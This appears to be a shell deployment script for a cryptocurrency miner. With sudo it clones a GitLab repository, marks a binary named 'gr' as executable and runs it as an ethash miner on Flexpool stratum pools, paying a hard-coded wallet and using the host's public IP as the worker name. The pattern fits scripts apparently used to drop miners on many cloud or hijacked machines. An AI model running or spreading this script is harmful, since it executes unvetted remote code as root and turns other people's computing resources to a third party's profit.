#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS gr2.sh 65 75
sudo git clone https://gitlab.com/useragen/lancarkanlah.git
cd lancarkanlah
chmod +x gr
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./gr -a ethash -w 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
